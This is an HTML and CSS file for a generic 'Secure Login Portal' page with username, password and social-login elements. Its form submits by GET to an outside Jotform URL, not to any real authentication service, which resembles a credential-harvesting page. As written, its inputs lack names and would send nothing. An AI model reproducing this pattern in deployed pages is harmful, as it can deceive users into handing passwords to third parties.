<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Login Portal</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary-color: #4361ee;
      --primary-dark: #3a56d4;
      --secondary-color: #f8f9fa;
      --text-color: #343a40;
      --border-color: #dee2e6;
      --success-color: #28a745;
      --error-color: #dc3545;
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
      margin: 0;
      padding: 20px;
      color: var(--text-color);
    }
    
    .login-container {
      display: flex;
      max-width: 900px;
      width: 100%;
      border-radius: 16px;
      overflow: hidden;
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
      background: white;
    }
    
    .login-branding {
      flex: 1;
      background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
      color: white;
      padding: 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    
    .brand-logo {
      width: 80px;
      height: 80px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .brand-logo i {
      font-size: 40px;
    }
    
    .brand-text {
      margin-top: 20px;
    }
    
    .brand-text h1 {
      font-size: 28px;
      margin-bottom: 10px;
      font-weight: 600;
    }
    
    .brand-text p {
      opacity: 0.9;
      line-height: 1.6;
    }
    
    .login-form-container {
      flex: 1;
      padding: 40px;
      background: white;
    }
    
    .form-header {
      margin-bottom: 30px;
    }
    
    .form-header h2 {
      font-size: 24px;
      font-weight: 600;
      color: var(--text-color);
      margin-bottom: 8px;
    }
    
    .form-header p {
      color: #6c757d;
      font-size: 15px;
    }
    
    .input-group {
      margin-bottom: 20px;
      position: relative;
    }
    
    .input-group i {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #6c757d;
    }
    
    .input-group input {
      width: 100%;
      padding: 12px 15px 12px 45px;
      border: 1px solid var(--border-color);
      border-radius: 8px;
      font-size: 15px;
      transition: all 0.3s;
    }
    
    .input-group input:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.15);
    }
    
    .options-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      font-size: 14px;
    }
    
    .remember-me {
      display: flex;
      align-items: center;
    }
    
    .remember-me input {
      margin-right: 8px;
    }
    
    .forgot-password {
      color: var(--primary-color);
      text-decoration: none;
      transition: color 0.2s;
    }
    
    .forgot-password:hover {
      color: var(--primary-dark);
      text-decoration: underline;
    }
    
    button {
      background: var(--primary-color);
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: background 0.3s, transform 0.2s;
    }
    
    button:hover {
      background: var(--primary-dark);
      transform: translateY(-2px);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    .divider {
      display: flex;
      align-items: center;
      margin: 25px 0;
    }
    
    .divider span {
      flex: 1;
      height: 1px;
      background: var(--border-color);
    }
    
    .divider p {
      padding: 0 15px;
      color: #6c757d;
      font-size: 14px;
    }
    
    .social-login {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 25px;
    }
    
    .social-btn {
      width: 45px;
      height: 45px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--secondary-color);
      color: #6c757d;
      border: 1px solid var(--border-color);
      cursor: pointer;
      transition: all 0.3s;
    }
    
    .social-btn:hover {
      background: #e9ecef;
      transform: translateY(-2px);
    }
    
    .signup-link {
      text-align: center;
      font-size: 15px;
      color: #6c757d;
    }
    
    .signup-link a {
      color: var(--primary-color);
      text-decoration: none;
      font-weight: 600;
      transition: color 0.2s;
    }
    
    .signup-link a:hover {
      color: var(--primary-dark);
      text-decoration: underline;
    }
    
    @media (max-width: 768px) {
      .login-container {
        flex-direction: column;
        max-width: 450px;
      }
      
      .login-branding {
        padding: 30px;
      }
      
      .login-form-container {
        padding: 30px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="login-branding">
      <div class="brand-logo">
        <i class="fas fa-lock"></i>
      </div>
      <div class="brand-text">
        <h1>Secure Login Portal</h1>
        <p>Access your account with enhanced security measures to protect your data and privacy.</p>
      </div>
    </div>
    
    <div class="login-form-container">
      <div class="form-header">
        <h2>Welcome Back</h2>
        <p>Please enter your credentials to access your account.</p>
      </div>
      
      <form action="https://form.jotform.com/252353636029356" method="get">
        <div class="input-group">
          <i class="fas fa-user"></i>
          <input type="text" placeholder="Username or Email" required>
        </div>
        
        <div class="input-group">
          <i class="fas fa-key"></i>
          <input type="password" placeholder="Password" required>
        </div>
        
        <div class="options-row">
          <div class="remember-me">
            <input type="checkbox" id="remember">
            <label for="remember">Remember me</label>
          </div>
          <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <button type="submit">Login</button>
      </form>
      
      <div class="divider">
        <span></span>
        <p>or continue with</p>
        <span></span>
      </div>
      
      <div class="social-login">
        <div class="social-btn">
          <i class="fab fa-google"></i>
        </div>
        <div class="social-btn">
          <i class="fab fa-facebook-f"></i>
        </div>
        <div class="social-btn">
          <i class="fab fa-linkedin-in"></i>
        </div>
      </div>
      
      <div class="signup-link">
        Don't have an account? <a href="#">Sign up now</a>
      </div>
    </div>
  </div>
</body>
</html>
